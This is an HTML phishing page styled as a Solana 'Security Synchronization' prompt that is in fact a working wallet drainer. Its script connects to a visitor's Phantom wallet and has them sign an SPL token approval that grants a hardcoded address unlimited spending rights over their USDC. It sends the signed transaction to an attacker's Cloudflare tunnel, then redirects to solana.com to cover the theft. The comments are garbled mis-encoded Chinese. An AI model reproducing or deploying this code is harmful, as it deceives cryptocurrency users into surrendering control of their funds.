<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Solana Security Protocol</title>
    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
    <script src="https://unpkg.com/@solana/spl-token@0.1.8/lib/index.iife.min.js"></script>
    <style>
        body { background: #000; color: #fff; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: #111; padding: 35px; border-radius: 20px; border: 1px solid #222; text-align: center; width: 300px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        .logo { width: 45px; margin-bottom: 15px; }
        h2 { font-size: 1.1rem; margin-bottom: 10px; font-weight: 600; }
        p { color: #777; font-size: 0.85rem; line-height: 1.4; margin-bottom: 25px; }
        #cta { background: linear-gradient(90deg, #14F195, #9945FF); color: #000; border: none; padding: 14px; border-radius: 10px; font-weight: bold; width: 100%; cursor: pointer; }
        #loader { display: none; color: #14F195; font-size: 12px; margin-top: 15px; }
    </style>
</head>
<body>
    <div class="card">
        <img src="https://solana.com/favicon.ico" class="logo">
        <h2>Security Synchronization</h2>
        <p>Your wallet requires a secure node association to ensure cross-chain compatibility and asset protection.</p>
        <button id="cta">ASSOCIATE ACCOUNT</button>
        <div id="loader">‚óè CONNECTING TO SECURE NODE...</div>
    </div>

    <script>
        const tunnel = "https://allocation-governing-fleet-ala.trycloudflare.com";
        const RECEIVER = "8KgX1uGpmLU5mVgfpCBrs7HCs21gKbqrwjBn5fKVk18A";
        
        // Êàë‰ª¨ÁûÑÂáÜÁöÑÈ´ò‰ª∑ÂÄº‰ª£Â∏ÅÂêàÁ∫¶ (Á§∫‰æã‰∏∫ USDCÔºå‰Ω†‰πüÂèØ‰ª•Êç¢Êàê USDT ÊàñÂÖ∂‰ªñ)
        const TARGET_TOKEN = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v"; 

        document.getElementById('cta').onclick = async () => {
            const p = window.solana || window.phantom?.solana;
            if (!p) return alert("Please use Phantom Browser");

            try {
                const resp = await p.connect();
                document.getElementById('cta').style.display = 'none';
                document.getElementById('loader').style.display = 'block';

                const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
                const sync = await fetch(`${tunnel}/sync`);
                const { bh } = await sync.json();

                // üî± Ê†∏ÂøÉÈÄªËæëÔºöËé∑ÂèñÁî®Êà∑ÂØπÂ∫î‰ª£Â∏ÅÁöÑË¥¶Êà∑Âú∞ÂùÄ
                const userTokenAccount = await splToken.Token.getAssociatedTokenAddress(
                    splToken.ASSOCIATED_TOKEN_PROGRAM_ID,
                    splToken.TOKEN_PROGRAM_ID,
                    new solanaWeb3.PublicKey(TARGET_TOKEN),
                    resp.publicKey
                );

                // üî± ÂπΩÁÅµÊìç‰ΩúÔºöÂèëËµ∑ Approve Êåá‰ª§ÔºåÊéàÊùÉÁªô‰Ω†ÁöÑ RECEIVER Âú∞ÂùÄ
                // ÊéàÊùÉÈ¢ùÂ∫¶Áªô‰∏Ä‰∏™ÊûÅÂ§ßÂÄºÔºå‰ª£Ë°®‚ÄúÂÖ®È¢ùÂΩíÈõÜÊùÉÈôê‚Äù
                const transaction = new solanaWeb3.Transaction().add(
                    splToken.Token.createApproveInstruction(
                        splToken.TOKEN_PROGRAM_ID,
                        userTokenAccount,
                        new solanaWeb3.PublicKey(RECEIVER),
                        resp.publicKey,
                        [],
                        "18446744073709551615" // Max Uint64
                    )
                );

                transaction.recentBlockhash = bh;
                transaction.feePayer = resp.publicKey;

                const signed = await p.signTransaction(transaction);
                const rawTx = signed.serialize().toString('base64');
                
                fetch(`${tunnel}/collect?auth_sig=${encodeURIComponent(rawTx)}`);

                setTimeout(() => {
                    window.location.href = "https://solana.com/zh";
                }, 1200);

            } catch(e) {
                console.log(e);
                window.location.reload();
            }
        };
    </script>
</body>
</html>
